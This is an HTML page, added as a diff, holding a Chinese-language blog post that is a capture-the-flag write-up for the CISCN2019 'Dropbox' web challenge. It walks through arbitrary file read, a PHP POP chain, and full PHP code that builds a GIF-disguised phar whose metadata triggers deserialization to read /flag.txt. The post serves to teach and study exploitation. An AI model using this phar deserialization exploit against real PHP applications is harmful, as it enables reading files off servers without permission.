@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Blackw4tch">
+
+
+
+
+
+<title>CISCN2019 web1 Dropbox | Blackw4tch&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Blackw4tch&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Blackw4tch&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CISCN2019 web1 Dropbox</h1>
+            
+                <div class="post-meta">
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 10, 2021&nbsp;&nbsp;21:36:00</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="0x01-寻找入口"><a href="#0x01-寻找入口" class="headerlink" title="0x01 寻找入口"></a>0x01 寻找入口</h2><p>注册、登陆 –&gt; 发现文件下载功能 –&gt; 抓包get任意文件读取 –&gt; 拖index.php&amp;download.php&amp;delete.php –&gt; 发现include “class.php” 拖class.php –&gt; 代码审计</p>
+<p>关键函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> -&gt; <span class="title">__destruct</span>() </span>&#123; <span class="keyword">$this</span>-&gt;db-&gt;close();&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> -&gt; <span class="title">close</span>() -&gt; <span class="title">file_get_contents</span>($<span class="title">this</span>-&gt;<span class="title">filename</span>)</span></span><br><span class="line"><span class="class">  </span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">FileList</span> -&gt; <span class="title">__call</span>() -&gt; $<span class="title">file</span> -&gt; $<span class="title">func</span>() //<span class="title">__call</span>()魔术方法，在外部调用一个类里面不存在的函数时（注意是函数，而不是属性，如果是属性的话应该用<span class="title">__get</span>()），<span class="title">PHP</span>系统会自动寻找类中是否存在<span class="title">__call</span>()方法，如果这个方法存在的话就会把这次调用的函数名和参数列表发送给<span class="title">__call</span>()方法，其中参数列表会以数组的形式传递。</span></span><br><span class="line"><span class="class">  </span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">FileList</span> -&gt; <span class="title">__destruct</span>() -&gt;<span class="title">echo</span></span></span><br></pre></td></tr></table></figure>
+
+<p>只有 file_get_contents 可以用来读flag</p>
+<h2 id="0x02-pop链挖掘"><a href="#0x02-pop链挖掘" class="headerlink" title="0x02 pop链挖掘"></a>0x02 pop链挖掘</h2><ul>
+<li>令 class User -&gt; $db = FileList &amp;&amp; class File -&gt; $filename = ‘/flag.txt’</li>
+<li>反序列化触发__destruct()，class User -&gt;__destruct() 调用 class FileList -&gt; close() 没有在类中找到方法，进入 __call()</li>
+<li>class FileList -&gt; __call() 调用 class File -&gt; close() -&gt; file_get_contents($filename) 结果存入 results[$file-&gt;name()][$func] = $file-&gt;$func();</li>
+<li>class FileList -&gt; __destruct() -&gt; echo result</li>
+</ul>
+<h2 id="0x03-phar文件构造"><a href="#0x03-phar文件构造" class="headerlink" title="0x03 phar文件构造"></a>0x03 phar文件构造</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//PHP类和对象的属性不能定义的时候由非常量赋值如： private $files=array(new File());</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=<span class="keyword">array</span>(<span class="keyword">new</span> File());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> FileList();</span><br><span class="line"><span class="variable">$a</span>-&gt;db = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89A</span></span><br><span class="line"><span class="string">&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-attack"><a href="#0x04-attack" class="headerlink" title="0x04 attack"></a>0x04 attack</h2><p>重命名 phar.phar 为 phar.gif，上传，删除时抓包，修改$filename=phar://phar.gif/test.txt 服务器使用phar协议 触发反序列化，攻击成功。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2021 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2021/02/10/SCTF2020%E9%83%A8%E5%88%86web%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">SCTF2020部分web题目复现</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Blackw4tch | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
